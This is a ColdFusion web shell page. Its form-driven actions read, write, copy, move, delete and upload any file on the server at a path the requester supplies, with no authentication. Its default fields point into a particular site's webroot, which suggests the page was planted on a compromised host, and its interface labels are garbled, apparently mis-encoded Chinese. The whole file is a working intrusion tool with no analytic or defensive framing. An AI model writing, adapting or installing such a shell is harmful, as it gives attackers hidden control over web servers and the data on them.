<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>

<CFCASE VALUE="read">
<CFFILE ACTION="Read" FILE="#Form.path#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
</CFCASE>

<CFCASE VALUE="write">
<CFFILE ACTION="Write" FILE="#Form.path#" OUTPUT="#Form.cmd#">
д��ɹ�
</CFCASE>

<CFCASE VALUE="copy">
<CFFILE ACTION="Copy" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
���Ƴɹ�
</CFCASE>

<CFCASE VALUE="move">
<CFFILE ACTION="MOVE" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
�ƶ��ɹ�
</CFCASE>

<CFCASE VALUE="delete">
<CFFILE ACTION="Delete" FILE="#Form.path#">
ɾ���ɹ�
</CFCASE>


<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">

�ϴ��ɹ�
</CFCASE>

<CFDEFAULTCASE>

<form action="" target="_blank" method=post>
<textarea style="width:600;height:200" name="cmd"></textarea><br>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72>
<input type=submit value="д���ļ�">
<input type=hidden name="action" value="write">
</form>
<br>

<form action="" target="_blank" method=post>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\index.cfm" size=72>
<input type=submit value="��ʾ�ļ�����">
<input type=hidden name="action" value="read">
</form>
<br>

<FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
��������: <INPUT NAME="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72><br>
�����ļ�: <INPUT NAME="FileContents" TYPE="file" size=50>
<input type=hidden name="action" value="upload">
<INPUT TYPE="submit" VALUE="�ϴ�">
</FORM>

<br>

<form action="" target="_blank" method=post>
Դ�ļ���<input name="source" value="D:\INETPUB\DRS.COM\WWWROOT\images\source.htm" size=65><br>
���Ƶ���<input name="DESTINATION" value="D:\INETPUB\DRS.COM\WWWROOT\images\DESTINATION.htm" size=65>
<input type=submit value="�����ļ�">
<input type=hidden name="action" value="copy">
</form>

<br>

<form action="" target="_blank" method=post>
Դ�ļ���<input name="source" value="D:\INETPUB\DRS.COM\WWWROOT\images\source.htm" size=65><br>
�ƶ�����<input name="DESTINATION" value="D:\INETPUB\DRS.COM\WWWROOT\images\DESTINATION.htm" size=65>
<input type=submit value="�ƶ��ļ�">
<input type=hidden name="action" value="move">
</form>

<br>

<form action="" target="_blank" method=post>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72>
<input type=submit value="ɾ��ָ���ļ�">
<input type=hidden name="action" value="delete">
</form>

</CFDEFAULTCASE>

</CFSWITCH>
